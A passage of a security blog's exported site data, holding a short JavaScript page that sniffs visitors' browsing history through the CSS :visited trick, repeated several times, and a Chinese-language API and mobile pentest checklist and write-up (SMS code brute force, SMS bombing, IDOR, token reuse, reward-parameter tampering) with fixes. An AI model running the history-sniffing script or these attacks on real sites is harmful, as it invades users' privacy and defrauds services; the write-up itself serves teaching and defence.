tags\n---\n","date":"2020-10-23T00:50:23.514Z","updated":"2020-10-23T00:50:23.514Z","path":"tags/index.html","comments":1,"_id":"ckgljhbsh0002iq0pa6ox32bn","content":"","site":{"data":{}},"excerpt":"","more":""},{"_content":"<!DOCTYPE html>\n<html>\n<body>\n<H3>Visited red</H3>\n<ul id=\"notvisited\"></ul>\n<script>\nvar websites = [\n\"https://www.baidu.com/\",\n\"http://wwww.google.com/\",\n\"http://www.sina.com.cn/\",\n\"http://www.qq.com/\",\n\"http://www.163.com/\",\n\"http://www.sohu.com/\",\n\"http://www.playsec.com/\",\n\"http://hi.baidu.com/\",\n\"http://zhidao.baidu.com/\",\n\"http://www.taobao.com/\",\n\"http://weibo.com/\",\n];\nfor (var i = 0; i < websites.length; i++) {\n     var link = document.createElement(\"a\");\n     link.id = \"id\" + i;\n     link.href = websites[i];\n     link.innerHTML = websites[i];\n     document.write('<style>');\n     document.write('#id' + i + \":visited {color: #FF0000;}\");\n     document.write('</style>');\n     document.body.appendChild(link);\n     var color = document.defaultView.getComputedStyle(link,null).getPropertyValue (\"color\");\n     document.body.removeChild(link);\nif (color == \"rgb(255, 0, 0)\") {\n     var item = document.createElement('li');\n     item.appendChild(link);\n     document.getElementById('visited').appendChild(item);\n          } else {\n               var item = document.createElement('li');\n               item.appendChild(link);\n               document.getElementById('notvisited').appendChild(item);\n          }\n}\n</script>\n</body>\n</html>","source":"Tools/xss_History.html","raw":"<!DOCTYPE html>\n<html>\n<body>\n<H3>Visited red</H3>\n<ul id=\"notvisited\"></ul>\n<script>\nvar websites = [\n\"https://www.baidu.com/\",\n\"http://wwww.google.com/\",\n\"http://www.sina.com.cn/\",\n\"http://www.qq.com/\",\n\"http://www.163.com/\",\n\"http://www.sohu.com/\",\n\"http://www.playsec.com/\",\n\"http://hi.baidu.com/\",\n\"http://zhidao.baidu.com/\",\n\"http://www.taobao.com/\",\n\"http://weibo.com/\",\n];\nfor (var i = 0; i < websites.length; i++) {\n     var link = document.createElement(\"a\");\n     link.id = \"id\" + i;\n     link.href = websites[i];\n     link.innerHTML = websites[i];\n     document.write('<style>');\n     document.write('#id' + i + \":visited {color: #FF0000;}\");\n     document.write('</style>');\n     document.body.appendChild(link);\n     var color = document.defaultView.getComputedStyle(link,null).getPropertyValue (\"color\");\n     document.body.removeChild(link);\nif (color == \"rgb(255, 0, 0)\") {\n     var item = document.createElement('li');\n     item.appendChild(link);\n     document.getElementById('visited').appendChild(item);\n          } else {\n               var item = document.createElement('li');\n               item.appendChild(link);\n               document.getElementById('notvisited').appendChild(item);\n          }\n}\n</script>\n</body>\n</html>","date":"2020-10-23T02:53:06.183Z","updated":"2020-10-23T02:53:06.183Z","path":"Tools/xss_History.html","title":"","comments":1,"layout":"page","_id":"ckglobhd20000b1hq1sn7fp9s","content":"<!DOCTYPE html>\n<html>\n<body>\n<H3>Visited red</H3>\n<ul id=\"notvisited\"></ul>\n<script>\nvar websites = [\n\"https://www.baidu.com/\",\n\"http://wwww.google.com/\",\n\"http://www.sina.com.cn/\",\n\"http://www.qq.com/\",\n\"http://www.163.com/\",\n\"http://www.sohu.com/\",\n\"http://www.playsec.com/\",\n\"http://hi.baidu.com/\",\n\"http://zhidao.baidu.com/\",\n\"http://www.taobao.com/\",\n\"http://weibo.com/\",\n];\nfor (var i = 0; i < websites.length; i++) {\n     var link = document.createElement(\"a\");\n     link.id = \"id\" + i;\n     link.href = websites[i];\n     link.innerHTML = websites[i];\n     document.write('<style>');\n     document.write('#id' + i + \":visited {color: #FF0000;}\");\n     document.write('</style>');\n     document.body.appendChild(link);\n     var color = document.defaultView.getComputedStyle(link,null).getPropertyValue (\"color\");\n     document.body.removeChild(link);\nif (color == \"rgb(255, 0, 0)\") {\n     var item = document.createElement('li');\n     item.appendChild(link);\n     document.getElementById('visited').appendChild(item);\n          } else {\n               var item = document.createElement('li');\n               item.appendChild(link);\n               document.getElementById('notvisited').appendChild(item);\n          }\n}\n</script>\n</body>\n</html>","site":{"data":{}},"excerpt":"","more":"<!DOCTYPE html>\n<html>\n<body>\n<H3>Visited red</H3>\n<ul id=\"notvisited\"></ul>\n<script>\nvar websites = [\n\"https://www.baidu.com/\",\n\"http://wwww.google.com/\",\n\"http://www.sina.com.cn/\",\n\"http://www.qq.com/\",\n\"http://www.163.com/\",\n\"http://www.sohu.com/\",\n\"http://www.playsec.com/\",\n\"http://hi.baidu.com/\",\n\"http://zhidao.baidu.com/\",\n\"http://www.taobao.com/\",\n\"http://weibo.com/\",\n];\nfor (var i = 0; i < websites.length; i++) {\n     var link = document.createElement(\"a\");\n     link.id = \"id\" + i;\n     link.href = websites[i];\n     link.innerHTML = websites[i];\n     document.write('<style>');\n     document.write('#id' + i + \":visited {color: #FF0000;}\");\n     document.write('</style>');\n     document.body.appendChild(link);\n     var color = document.defaultView.getComputedStyle(link,null).getPropertyValue (\"color\");\n     document.body.removeChild(link);\nif (color == \"rgb(255, 0, 0)\") {\n     var item = document.createElement('li');\n     item.appendChild(link);\n     document.getElementById('visited').appendChild(item);\n          } else {\n               var item = document.createElement('li');\n               item.appendChild(link);\n               document.getElementById('notvisited').appendChild(item);\n          }\n}\n</script>\n</body>\n</html>"}],"Post":[{"title":"Hello World","date":"2019-03-04T16:00:00.000Z","_content":"Blog涉及总结WEB&APP常规漏洞、逻辑漏洞、智能卡、安全相关等...\n学习使您我更强大😁.\n\n### 公众号\n\n```\n个人公众号\n```\n\n![](/images/mp-wechat.jpg)\n\n### Github\n```\ngithub中记录一些小工具或其他大佬好用项目.\n```\n[Github](https://github.com/si1ent-le)\n\n\n\n","source":"_posts/hello-world.md","raw":"---\ntitle: Hello World\ndate: 2019-03-05\n---\nBlog涉及总结WEB&APP常规漏洞、逻辑漏洞、智能卡、安全相关等...\n学习使您我更强大😁.\n\n### 公众号\n\n```\n个人公众号\n```\n\n![](/images/mp-wechat.jpg)\n\n### Github\n```\ngithub中记录一些小工具或其他大佬好用项目.\n```\n[Github](https://github.com/si1ent-le)\n\n\n\n","slug":"hello-world","published":1,"updated":"2020-10-23T02:29:26.015Z","_id":"ckgljcnno0000hd0p6n4x96ao","comments":1,"layout":"post","photos":[],"link":"","content":"<p>Blog涉及总结WEB&amp;APP常规漏洞、逻辑漏洞、智能卡、安全相关等…<br>学习使您我更强大😁.</p>\n<h3 id=\"公众号\"><a href=\"#公众号\" class=\"headerlink\" title=\"公众号\"></a>公众号</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">个人公众号</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/mp-wechat.jpg\"></p>\n<h3 id=\"Github\"><a href=\"#Github\" class=\"headerlink\" title=\"Github\"></a>Github</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">github中记录一些小工具或其他大佬好用项目.</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://github.com/si1ent-le\">Github</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>Blog涉及总结WEB&amp;APP常规漏洞、逻辑漏洞、智能卡、安全相关等…<br>学习使您我更强大😁.</p>\n<h3 id=\"公众号\"><a href=\"#公众号\" class=\"headerlink\" title=\"公众号\"></a>公众号</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">个人公众号</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/mp-wechat.jpg\"></p>\n<h3 id=\"Github\"><a href=\"#Github\" class=\"headerlink\" title=\"Github\"></a>Github</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">github中记录一些小工具或其他大佬好用项目.</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://github.com/si1ent-le\">Github</a></p>\n"},{"title":"API及客户端漏洞挖掘","date":"2020-06-09T09:52:37.000Z","_content":"\n## API及客户端漏洞挖掘\n\n## 准备\n```bash\n* API文档(postman生成document文档或单功能测试)\n* 测试账户两个(权限不同账户)\n* Burp Suite工具\n* Postman\n* MobSF框架\n* 浏览器及插件(Chrome&Modheader&postman插件)\n* 更新....\n```\n\n## 检测方式\n\n```BASH\n1、黑盒：只指定apk、ipa安全测试\n2、灰盒：API文档、apk、ipa等\n3、白盒：审计\n```\n\n## 检测项目及可能存在漏洞\n\n```BASH\n备注：\n以下整理漏洞可能会存在各自负责待测系统上请谨慎测试.\n留意代码逻辑处理是否安全.\n```\n\n### 客户端\n#### APK\n1. 反编译\n2. APK签名检测\n3. 敏感信息泄露\n4. 组件安全\n5. 应用程序是否可备份\n6. 应用程序权限检测\n7. 敏感信息泄露\n8. UI泄露\n9. 等等\n#### IPA\n1. 安全编译选项\n2. 加密缺陷(弱算法、密钥泄露)\n3. 不安全随机数\n4. XcodeGhost漏洞\n5. AFNetworking SSL漏洞\n6. 数据存储安全\n7. 日志敏感信息\n8. 网络传输安全\n9. 存储测试服域名或IP地址\n10. 等等\n\n### API及Web\n1. 注册&登陆入口\n   1. 手机号注册登陆\n      1. 短信验证码爆破\n      2. 短信验证码回传\n      3. 短信验证码失效时间较短\n      4. 等等验证码安全问题\n   2. 昵称登陆\n      1. 验证码复用\n      2. 爆破\n      3. 用户明文传输(可忽略不计,但建议加密处理)\n   3. 任意账户注册\n      1. 系统可随机注册不做手机号及昵称检测(检测是否已注册)\n2. 用户个人信息\n   1. 用户名修改处可能存在XSS(跨站脚本攻击)\n   2. 越权修改他人个人信息(通过修改用户uid越权修改他人信息)\n   3. UI信息泄露(个人手机号及他人手机号隐藏展示)\n   4. 越权访问(通过UID越权访问他人信息)\n3. 文章/视频类\n   1. 参数处存在SQL注入(未过滤)\n   2. 命令执行(未对用户输入命令进行转义)\n   3. 或其他Web漏洞\n4. 分享/红包\n   1. 绕过系统检测分享获取红包(用户注册后台及时更新记录)\n5. 签到\n   1. 用户可一直进行签到(绕过签到检测规则)\n6. 金额\n   1. 绕过金额最低提现检测(后台检测金额并对比)\n7. 用户关系\n   1. 越权访问(可对比用户个人信息项)\n8. 新手\n   1. 参数未做处理(修改参数即可刷金额,每访问一次会自动加一)\n9. 系统报错\n   1. debug模式开启报错致信息泄漏(看所用框架类型)\n      1. **debug模式研发须在产品上线前进行关闭**\n\n-------\n\n## 实战API渗透测试\n\n(以下部分演示不完全来自一个API检测结果,同时内部包含部分移动端检测.)\n## 客户端敏感信息\n### 1、漏洞位置\n敏感数据存在app安装的数据目录中缓存用户的部分信息。\n### 2、漏洞影响\n2.1、root手机ssh登陆所在安装目录\n![](/images/media/FB934E81-F2C3-4994-B399-FE384628D826.png)\n2.2、查找敏感数据\n![](/images/media/8BF0DD98-9D32-4269-A2E5-A6E70F7D8FDD.png)\n\n### 3、漏洞修复\n1、客户端不要缓存客户敏感信息\n2、客户端脱密后存储\n## IPA内存在测试服域名信息\n### 1、漏洞位置\nIPA源码内存放部分域名信息，被静态分析得到(一般移动端建议经过安全加固进行处理,如果处于debug包可能会泄漏相关信息.)\n\n### 2、漏洞影响\n\n2.1、使用本地移动框架自动检测ipa包\n![](/images/media/DB6EE945-6970-49D9-980F-1BFB50B9B59C.png)\n2.2、URL信息获取\n![](/images/media/4EE52193-37CC-455B-B23A-AD4295F1B23A.png)\n\n### 3、漏洞修复\n\n1、手工检查并清理\n2、针对APK或IPA包进行第三方加固是实现自动清理\n\n## UI信息泄漏\n\n### 1、漏洞位置\n用户个人信息及其他信息处(此类漏洞针对金融类APP必须进行后端隐藏处理.)\n\n### 2、漏洞影响\n\n2.1、好友处手机号明文显示\n\n![](/images/media/15823569889588.png)\n\n![](/images/media/15823409378663.png)\n\n### 3、漏洞修复\n\n1、后端对用户手机号或账户名进行隐藏处理\n\n![](/images/media/15823410770897.png)\n\n## 短信验证码爆破\n\n### 1、漏洞位置\n\n漏洞主要出现用户注册、短信登陆,部分个人手机号绑定等功能处会存在这一安全问题.\n\n### 2、漏洞影响\n\n2.1、验证码获取接口\n![](/images/media/15823354311582.png)\n2.2、截获数据包并加载字典进行爆破\n![](/images/media/15823355728990.png) \n\n### 3、漏洞修复\n\n1、验证失效时间设置5分钟以内\n2、验证码长度设置6为\n\n## 短信轰炸\n\n### 1、漏洞位置\n\n注册或个人密码修改获取验证码处如果未对获取进行次数限制会导致此类漏洞\n\n### 2、漏洞影响\n\n2.1、获取验证码\n![](/images/media/15823511692830.png)\n2.2、手机收到15条短信\n![](/images/media/15823511987787.png)\n\n### 3、漏洞修复\n\n1、短信获取次数限制\n\n## 越权访问\n\n### 1、漏洞位置\n\n通过修改UID获取其他账户信息;\n\n### 2、漏洞影响\n\n修改user_id获取其他用户信息\n\n![](/images/media/15822804505543.png)\n\n### 3、漏洞修复\n\n1、权限严格控制（后端进行不同账户权限分离）\n\n## 权限绕过\n\n### 1、漏洞位置\n\n此漏洞是由于系统进行认证而导致的同一token可登录不同系统中，这类漏洞可以检测针对前后端分离且后端登录入口也是调API来登录的系统.\n\n### 2、漏洞影响\n\n2.1、普通账户认证获取的token\n![](/images/media/15856606263756.png)\n2.2、插件替换token，实现权限绕过\n![](/images/media/15856613206100.png)\n2.3、其他操作需结合系统功能进行查找(这里建议查看JS或许能够获取大概请求信息以及F12)\n![](/images/media/15856613422173.png)\n2.4、替换的token可直接调用此API\n![](/images/media/15856613834891.png)\n\n### 3、漏洞修复\n\n1、权限控制严格\n\n## 参数修改\n\n### 1、漏洞位置\n\n此漏洞多出现用户访问指定文件或视屏后即可获取奖励，而参数未进行限制（数量未作限制）\n\n### 2、漏洞影响\n\n2.1、用户数据修改参数即可完成刷红包\n![](/images/media/15856614616000.png)\n2.2、后台未对参数进行数量限制导致修改sort即可刷红包\n![](/images/media/7991927F-0364-4E4A-A8C5-CF0916767091.png)\n\n### 3、漏洞修复\n\n1、设定sort参数并做好数量限制\n\n## 敏感信息泄露\n### 1、漏洞位置\n\n此类漏洞因用户提交恶意字符而服务器端无法解析等问题导致的信息泄露均归属到敏感信息泄露；\n\n### 2、漏洞影响\n\n2.1、URL访问如服务器端响应报错\n![](/images/media/15823482281156.png)\n2.2、服务器端敏感文件泄露(某高校缴费系统泄露)\n![](/images/media/15823487150343.png)\n\n### 3、漏洞修复\n\n1、关闭debug\n2、清理不必要文件、日志等\n\n## 扩展其他\n## 任意账户注册\n### 1、漏洞位置\n\n手机号注册未对手机号或昵称进行是否注册检测,或敏感内部平台对外提供服务而为关闭注册入口等.\n\n### 2、漏洞影响\n\n2.1、YAPI任意账户注册\n![](/images/media/5427A3FB-D549-444E-80CC-2870F17A3796.png)\n2.2、项目信息,同时越权访问其他邮箱信息\n![](/images/media/8612A948-98C1-4D83-A017-5B3134691603.png)\n\n### 3、漏洞修复\n\n1、关闭注册入口\n","source":"_posts/API及客户端渗透测试-1.md","raw":"---\ntitle: API及客户端漏洞挖掘\ndate: 2020-06-09 17:52:37\ntag:\n   - API渗透\n---\n\n## API及客户端漏洞挖掘\n\n## 准备\n```bash\n* API文档(postman生成document文档或单功能测试)\n* 测试账户两个(权限不同账户)\n* Burp Suite工具\n* Postman\n* MobSF框架\n* 浏览器及插件(Chrome&Modheader&postman插件)\n* 更新....\n```\n\n## 检测方式\n\n```BASH\n1、黑盒：只指定apk、ipa安全测试\n2、灰盒：API文档、apk、ipa等\n3、白盒：审计\n```\n\n## 检测项目及可能存在漏洞\n\n```BASH\n备注：\n以下整理漏洞可能会存在各自负责待测系统上请谨慎测试.\n留意代码逻辑处理是否安全.\n```\n\n### 客户端\n#### APK\n1. 反编译\n2. APK签名检测\n3. 敏感信息泄露\n4. 组件安全\n5. 应用程序是否可备份\n6. 应用程序权限检测\n7. 敏感信息泄露\n8. UI泄露\n9. 等等\n#### IPA\n1. 安全编译选项\n2. 加密缺陷(弱算法、密钥泄露)\n3. 不安全随机数\n4. XcodeGhost漏洞\n5. AFNetworking SSL漏洞\n6. 数据存储安全\n7. 日志敏感信息\n8. 网络传输安全\n9. 存储测试服域名或IP地址\n10. 等等\n\n### API及Web\n1. 注册&登陆入口\n   1. 手机号注册登陆\n      1. 短信验证码爆破\n      2. 短信验证码回传\n      3. 短信验证码失效时间较短\n      4. 等等验证码安全问题\n   2. 昵称登陆\n      1. 验证码复用\n      2. 爆破\n      3. 用户明文传输(可忽略不计,但建议加密处理)\n   3. 任意账户注册\n      1. 系统可随机注册不做手机号及昵称检测(检测是否已注册)\n2. 用户个人信息\n   1. 用户名修改处可能存在XSS(跨站脚本攻击)\n   2. 越权修改他人个人信息(通过修改用户uid越权修改他人信息)\n   3. UI信息泄露(个人手机号及他人手机号隐藏展示)\n   4. 越权访问(通过UID越权访问他人信息)\n3. 文章/视频类\n   1. 参数处存在SQL注入(未过滤)\n   2. 命令执行(未对用户输入命令进行转义)\n   3. 或其他Web漏洞\n4. 分享/红包\n   1. 绕过系统检测分享获取红包(用户注册后台及时更新记录)\n5. 签到\n   1. 用户可一直进行签到(绕过签到检测规则)\n6. 金额\n   1. 绕过金额最低提现检测(后台检测金额并对比)\n7. 用户关系\n   1. 越权访问(可对比用户个人信息项)\n8. 新手\n   1. 参数未做处理(修改参数即可刷金额,每访问一次会自动加一)\n9. 系统报错\n   1. debug模式开启报错致信息泄漏(看所用框架类型)\n      1. **debug模式研发须在产品上线前进行关闭**\n\n-------\n\n## 实战API渗透测试\n\n(以下部分演示不完全来自一个API检测结果,同时内部包含部分移动端检测.)\n## 客户端敏感信息\n### 1、漏洞位置\n敏感数据存在app安装的数据目录中缓存用户的部分信息。\n### 2、漏洞影响\n2.1、root手机ssh登陆所在安装目录\n![](/images/media/FB934E81-F2C3-4994-B399-FE384628D826.png)\n2.2、查找敏感数据\n![](/images/media/8BF0DD98-9D32-4269-A2E5-A6E70F7D8FDD.png)\n\n### 3、漏洞修复\n1、客户端不要缓存客户敏感信息\n2、客户端脱密后存储\n## IPA内存在测试服域名信息\n### 1、漏洞位置\nIPA源码内存放部分域名信息，被静态分析得到(一般移动端建议经过安全加固进行处理,如果处于debug包可能会泄漏相关信息.)\n\n### 2、漏洞影响\n\n2.1、使用本地移动框架自动检测ipa包\n![](/images/media/DB6EE945-6970-49D9-980F-1BFB50B9B59C.png)\n2.2、URL信息获取\n![](/images/media/4EE52193-37CC-455B-B23A-AD4295F1B23A.png)\n\n### 3、漏洞修复\n\n1、手工检查并清理\n2、针对APK或IPA包进行第三方加固是实现自动清理\n\n## UI信息泄漏\n\n### 1、漏洞位置\n用户个人信息及其他信息处(此类漏洞针对金融类APP必须进行后端隐藏处理.)\n\n### 2、漏洞影响\n\n2.1、好友处手机号明文显示\n\n![](/images/media/15823569889588.png)\n\n![](/images/media/15823409378663.png)\n\n### 3、漏洞修复\n\n1、后端对用户手机号或账户名进行隐藏处理\n\n![](/images/media/15823410770897.png)\n\n## 短信验证码爆破\n\n### 1、漏洞位置\n\n漏洞主要出现用户注册、短信登陆,部分个人手机号绑定等功能处会存在这一安全问题.\n\n### 2、漏洞影响\n\n2.1、验证码获取接口\n![](/images/media/15823354311582.png)\n2.2、截获数据包并加载字典进行爆破\n![](/images/media/15823355728990.png) \n\n### 3、漏洞修复\n\n1、验证失效时间设置5分钟以内\n2、验证码长度设置6为\n\n## 短信轰炸\n\n### 1、漏洞位置\n\n注册或个人密码修改获取验证码处如果未对获取进行次数限制会导致此类漏洞\n\n### 2、漏洞影响\n\n2.1、获取验证码\n![](/images/media/15823511692830.png)\n2.2、手机收到15条短信\n![](/images/media/15823511987787.png)\n\n### 3、漏洞修复\n\n1、短信获取次数限制\n\n## 越权访问\n\n### 1、漏洞位置\n\n通过修改UID获取其他账户信息;\n\n### 2、漏洞影响\n\n修改user_id获取其他用户信息\n\n![](/images/media/15822804505543.png)\n\n### 3、漏洞修复\n\n1、权限严格控制（后端进行不同账户权限分离）\n\n## 权限绕过\n\n### 1、漏洞位置\n\n此漏洞是由于系统进行认证而导致的同一token可登录不同系统中，这类漏洞可以检测针对前后端分离且后端登录入口也是调API来登录的系统.\n\n### 2、漏洞影响\n\n2.1、普通账户认证获取的token\n![](/images/media/15856606263756.png)\n2.2、插件替换token，实现权限绕过\n![](/images/media/15856613206100.png)\n2.3、其他操作需结合系统功能进行查找(这里建议查看JS或许能够获取大概请求信息以及F12)\n![](/images/media/15856613422173.png)\n2.4、替换的token可直接调用此API\n![](/images/media/15856613834891.png)\n\n### 3、漏洞修复\n\n1、权限控制严格\n\n## 参数修改\n\n### 1、漏洞位置\n\n此漏洞多出现用户访问指定文件或视屏后即可获取奖励，而参数未进行限制（数量未作限制）\n\n### 2、漏洞影响\n\n2.1、用户数据修改参数即可完成刷红包\n![](/images/media/15856614616000.png)\n2.2、后台未对参数进行数量限制导致修改sort即可刷红包\n![](/images/media/7991927F-0364-4E4A-A8C5-CF0916767091.png)\n\n### 3、漏洞修复\n\n1、设定sort参数并做好数量限制\n\n## 敏感信息泄露\n### 1、漏洞位置\n\n此类漏洞因用户提交恶意字符而服务器端无法解析等问题导致的信息泄露均归属到敏感信息泄露；\n\n### 2、漏洞影响\n\n2.1、URL访问如服务器端响应报错\n![](/images/media/15823482281156.png)\n2.2、服务器端敏感文件泄露(某高校缴费系统泄露)\n![](/images/media/15823487150343.png)\n\n### 3、漏洞修复\n\n1、关闭debug\n2、清理不必要文件、日志等\n\n## 扩展其他\n## 任意账户注册\n### 1、漏洞位置\n\n手机号注册未对手机号或昵称进行是否注册检测,或敏感内部平台对外提供服务而为关闭注册入口等.\n\n### 2、漏洞影响\n\n2.1、YAPI任意账户注册\n![](/images/media/5427A3FB-D549-444E-80CC-2870F17A3796.png)\n2.2、项目信息,同时越权访问其他邮箱信息\n![](/images/media/8612A948-98C1-4D83-A017-5B3134691603.png)\n\n### 3、漏洞修复\n\n1、关闭注册入口\n","slug":"API及客户端渗透测试-1","published":1,"updated":"2020-10-23T03:32:31.062Z","_id":"ckglobhd60001b1hqao6f43mp","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"API及客户端漏洞挖掘\"><a href=\"#API及客户端漏洞挖掘\" class=\"headerlink\" title=\"API及客户端漏洞挖掘\"></a>API及客户端漏洞挖掘</h2><h2 id=\"准备\"><a href=\"#准备\" class=\"headerlink\" title=\"准备\"></a>准备</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">* API文档(postman生成document文档或单功能测试)</span><br><span class=\"line\">* 测试账户两个(权限不同账户)</span><br><span class=\"line\">* Burp Suite工具</span><br><span class=\"line\">* Postman</span><br><span class=\"line\">* MobSF框架</span><br><span class=\"line\">* 浏览器及插件(Chrome&amp;Modheader&amp;postman插件)</span><br><span class=\"line\">* 更新....</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"检测方式\"><a href=\"#检测方式\" class=\"headerlink\" title=\"检测方式\"></a>检测方式</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、黑盒：只指定apk、ipa安全测试</span><br><span class=\"line\">2、灰盒：API文档、apk、ipa等</span><br><span class=\"line\">3、白盒：审计</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"检测项目及可能存在漏洞\"><a href=\"#检测项目及可能存在漏洞\" class=\"headerlink\" title=\"检测项目及可能存在漏洞\"></a>检测项目及可能存在漏洞</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">备注：</span><br><span class=\"line\">以下整理漏洞可能会存在各自负责待测系统上请谨慎测试.</span><br><span class=\"line\">留意代码逻辑处理是否安全.</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"客户端\"><a href=\"#客户端\" class=\"headerlink\" title=\"客户端\"></a>客户端</h3><h4 id=\"APK\"><a href=\"#APK\" class=\"headerlink\" title=\"APK\"></a>APK</h4><ol>\n<li>反编译</li>\n<li>APK签名检测</li>\n<li>敏感信息泄露</li>\n<li>组件安全</li>\n<li>应用程序是否可备份</li>\n<li>应用程序权限检测</li>\n<li>敏感信息泄露</li>\n<li>UI泄露</li>\n<li>等等<h4 id=\"IPA\"><a href=\"#IPA\" class=\"headerlink\" title=\"IPA\"></a>IPA</h4></li>\n<li>安全编译选项</li>\n<li>加密缺陷(弱算法、密钥泄露)</li>\n<li>不安全随机数</li>\n<li>XcodeGhost漏洞</li>\n<li>AFNetworking SSL漏洞</li>\n<li>数据存储安全</li>\n<li>日志敏感信息</li>\n<li>网络传输安全</li>\n<li>存储测试服域名或IP地址</li>\n<li>等等</li>\n</ol>\n<h3 id=\"API及Web\"><a href=\"#API及Web\" class=\"headerlink\" title=\"API及Web\"></a>API及Web</h3><ol>\n<li>注册&amp;登陆入口<ol>\n<li>手机号注册登陆<ol>\n<li>短信验证码爆破</li>\n<li>短信验证码回传</li>\n<li>短信验证码失效时间较短</li>\n<li>等等验证码安全问题</li>\n</ol>\n</li>\n<li>昵称登陆<ol>\n<li>验证码复用</li>\n<li>爆破</li>\n<li>用户明文传输(可忽略不计,但建议加密处理)</li>\n</ol>\n</li>\n<li>任意账户注册<ol>\n<li>系统可随机注册不做手机号及昵称检测(检测是否已注册)</li>\n</ol>\n</li>\n</ol>\n</li>\n<li>用户个人信息<ol>\n<li>用户名修改处可能存在XSS(跨站脚本攻击)</li>\n<li>越权修改他人个人信息(通过修改用户uid越权修改他人信息)</li>\n<li>UI信息泄露(个人手机号及他人手机号隐藏展示)</li>\n<li>越权访问(通过UID越权访问他人信息)</li>\n</ol>\n</li>\n<li>文章/视频类<ol>\n<li>参数处存在SQL注入(未过滤)</li>\n<li>命令执行(未对用户输入命令进行转义)</li>\n<li>或其他Web漏洞</li>\n</ol>\n</li>\n<li>分享/红包<ol>\n<li>绕过系统检测分享获取红包(用户注册后台及时更新记录)</li>\n</ol>\n</li>\n<li>签到<ol>\n<li>用户可一直进行签到(绕过签到检测规则)</li>\n</ol>\n</li>\n<li>金额<ol>\n<li>绕过金额最低提现检测(后台检测金额并对比)</li>\n</ol>\n</li>\n<li>用户关系<ol>\n<li>越权访问(可对比用户个人信息项)</li>\n</ol>\n</li>\n<li>新手<ol>\n<li>参数未做处理(修改参数即可刷金额,每访问一次会自动加一)</li>\n</ol>\n</li>\n<li>系统报错<ol>\n<li>debug模式开启报错致信息泄漏(看所用框架类型)<ol>\n<li><strong>debug模式研发须在产品上线前进行关闭</strong></li>\n</ol>\n</li>\n</ol>\n</li>\n</ol>\n<hr>\n<h2 id=\"实战API渗透测试\"><a href=\"#实战API渗透测试\" class=\"headerlink\" title=\"实战API渗透测试\"></a>实战API渗透测试</h2><p>(以下部分演示不完全来自一个API检测结果,同时内部包含部分移动端检测.)</p>\n<h2 id=\"客户端敏感信息\"><a href=\"#客户端敏感信息\" class=\"headerlink\" title=\"客户端敏感信息\"></a>客户端敏感信息</h2><h3 id=\"1、漏洞位置\"><a href=\"#1、漏洞位置\" class=\"headerlink\" title=\"1、漏洞位置\"></a>1、漏洞位置</h3><p>敏感数据存在app安装的数据目录中缓存用户的部分信息。</p>\n<h3 id=\"2、漏洞影响\"><a href=\"#2、漏洞影响\" class=\"headerlink\" title=\"2、漏洞影响\"></a>2、漏洞影响</h3><p>2.1、root手机ssh登陆所在安装目录<br><img src=\"/images/media/FB934E81-F2C3-4994-B399-FE384628D826.png\"><br>2.2、查找敏感数据<br><img src=\"/images/media/8BF0DD98-9D32-4269-A2E5-A6E70F7D8FDD.png\"></p>\n<h3 id=\"3、漏洞修复\"><a href=\"#3、漏洞修复\" class=\"headerlink\" title=\"3、漏洞修复\"></a>3、漏洞修复</h3><p>1、客户端不要缓存客户敏感信息<br>2、客户端脱密后存储</p>\n<h2 id=\"IPA内存在测试服域名信息\"><a href=\"#IPA内存在测试服域名信息\" class=\"headerlink\" title=\"IPA内存在测试服域名信息\"></a>IPA内存在测试服域名信息</h2><h3 id=\"1、漏洞位置-1\"><a href=\"#1、漏洞位置-1\" class=\"headerlink\" title=\"1、漏洞位置\"></a>1、漏洞位置</h3><p>IPA源码内存放部分域名信息，被静态分析得到(一般移动端建议经过安全加固进行处理,如果处于debug包可能会泄漏相关信息.)</p>\n<h3 id=\"2、漏洞影响-1\"><a href=\"#2、漏洞影响-1\" class=\"headerlink\" title=\"2、漏洞影响\"></a>2、漏洞影响</h3><p>2.1、使用本地移动框架自动检测ipa包<br><img src=\"/images/media/DB6EE945-6970-49D9-980F-1BFB50B9B59C.png\"><br>2.2、URL信息获取<br><img src=\"/images/media/4EE52193-37CC-455B-B23A-AD4295F1B23A.png\"></p>\n<h3 id=\"3、漏洞修复-1\"><a href=\"#3、漏洞修复-1\" class=\"headerlink\" title=\"3、漏洞修复\"></a>3、漏洞修复</h3><p>1、手工检查并清理<br>2、针对APK或IPA包进行第三方加固是实现自动清理</p>\n<h2 id=\"UI信息泄漏\"><a href=\"#UI信息泄漏\" class=\"headerlink\" title=\"UI信息泄漏\"></a>UI信息泄漏</h2><h3 id=\"1、漏洞位置-2\"><a href=\"#1、漏洞位置-2\" class=\"headerlink\" title=\"1、漏洞位置\"></a>1、漏洞位置</h3><p>用户个人信息及其他信息处(此类漏洞针对金融类APP必须进行后端隐藏处理.)</p>\n<h3 id=\"2、漏洞影响-2\"><a href=\"#2、漏洞影响-2\" 